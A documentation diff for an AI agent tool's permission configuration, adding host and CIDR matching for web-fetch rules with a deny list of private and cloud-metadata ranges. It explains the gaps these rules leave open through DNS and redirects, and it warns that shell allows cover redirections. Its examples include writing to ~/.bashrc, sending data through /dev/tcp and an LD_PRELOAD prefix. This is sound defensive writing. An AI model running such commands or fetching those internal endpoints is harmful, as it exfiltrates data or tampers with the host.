@@ -30,8 +30,10 @@ permission:
   delegate: deny
   delete: ask
   web_fetch:
-    "http://localhost:8000/*": ask
-    "http://169.254.169.254/*": deny
+    "localhost:8000": ask
+    "169.254.0.0/16": deny
+    "10.0.0.0/8": deny
+    "192.168.0.0/16": deny
   shell:
     "sudo *": ask
     "rm *": ask
@@ -48,6 +50,32 @@ permission:
 ```
 
 This means: allow most tools by default; disable `handoff` and `delegate`; require confirmation for file deletion, selected WebFetch URL patterns, and common high-risk shell/git commands. Permission rules use “last match wins”, so the more specific `web_fetch` and `shell` rules above override the top-level `"*": allow`. This is reasonable for a single-user trusted workspace; shared repositories, team services, or automated headless deployments should tighten it further. This page starts from `"*": allow` as a trusted-workspace baseline; for a least-privilege baseline instead, the `builder` agent in [Configuration — Agent config](./configuration.md#agent-config) starts from `"*": deny` and opts in only to the tools a role needs. Pick whichever baseline matches your trust model.
+
+### WebFetch target matching
+
+`web_fetch` rule patterns use network-aware host matching. A pattern has the
+shape `host[:port]`:
+
+- **host**: a domain (`example.com`), a domain wildcard (`*.internal`, `*`), a literal IP (`127.0.0.1`, `::1`), or a CIDR range (`10.0.0.0/8`, `169.254.0.0/16`, `fd00::/8`). Bracket IPv6 addresses and IPv6 CIDRs when specifying a port, for example `[fd00::/8]:443`.
+- **port**: omit it (or use `*`) for any; use a single port (`8080`) or a range (`8000-9000`). When the requested URL omits its port, the port defaults from the URL scheme (http→80, https→443).
+- Scheme and path patterns are not supported.
+
+```yaml
+web_fetch:
+  "*": allow                  # default: allow everything
+  "0.0.0.0/8": deny
+  "10.0.0.0/8": deny
+  "127.0.0.0/8": deny
+  "169.254.0.0/16": deny      # cloud metadata endpoint
+  "192.168.0.0/16": deny
+  "*:8000-9000": ask         # any host on these ports needs confirmation
+  "*.internal": deny         # internal domains
+```
+
+Matching happens **before the request is sent**, against the URL the model supplied.
+It is not re-checked against the resolved connection IP, so a hostname that resolves
+to an internal address, or an HTTP redirect to one, is **not** blocked by an IP/CIDR
+rule. Treat these rules as intent-level gating, not a network sandbox.
 
 ### Special permission semantics
 
@@ -75,6 +103,8 @@ Most tools use the literal `allow` / `ask` / `deny` meaning above, but a few orc
 
 For `shell`, a specific `allow` pattern such as `"git *": allow` does not auto-allow compound commands containing unquoted shell separators (`;`, `&&`, `||`, `|`, `&`, or newlines). Those calls fall through to the next matching rule, typically `ask` or `deny`. Use this as a safety backstop, not as shell sandboxing; keep broad rules like `shell: allow` or `shell: { "*": allow }` for only fully trusted roles.
 
+A command-specific `allow` does, however, cover the full capability of that command, including output redirections and inline environment-assignment prefixes. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, `data > /dev/tcp/host/port`, and `LD_PRELOAD=./x.so echo hi` are all allowed — the redirection target and the environment prefix are part of that single shell command, not a separate tool call, so they are not matched or gated on their own. Grant a command-level `allow` only to commands whose worst case (arbitrary file writes via redirection, an overridden environment) you accept; otherwise keep them at `ask`.
+
 ## Shell / shell risk
 
 `shell` can execute system commands and should be treated carefully. `shell` and `spawn` are intentionally non-interactive: Chord does not wire model-controlled stdin into child processes, Unix child processes run without a controlling TTY, and high-confidence interactive commands are rejected before execution. Plain stdin reads such as shell `read`/`select` observe EOF instead of waiting for model input; provide data explicitly with a pipe, here-doc, file, or arguments when a command expects input. Login wizards, terminal editors, pagers/full-screen TUIs, password prompts, and commands that require `/dev/tty` should be run manually in a real terminal or rewritten with explicit non-interactive input/flags.
@@ -97,7 +127,7 @@ Common rewrites:
 Recommendations:
 
 - Keep file deletion, bulk rewrites, network downloads, and database operations as `ask` or `deny` by default
-- Use `web_fetch` URL patterns when you want to gate local/private services or sensitive endpoints, for example `web_fetch: { "http://localhost:8000/*": ask }`
+- Use `web_fetch` patterns to gate local/private services or sensitive endpoints — by host/port (`web_fetch: { "localhost:8000": ask }`) or by address range (`web_fetch: { "169.254.0.0/16": deny, "*:8000-9000": ask }`)
 - Set `allow` only for a small set of predictable development commands
 - Do not treat permission matching as a security sandbox
 
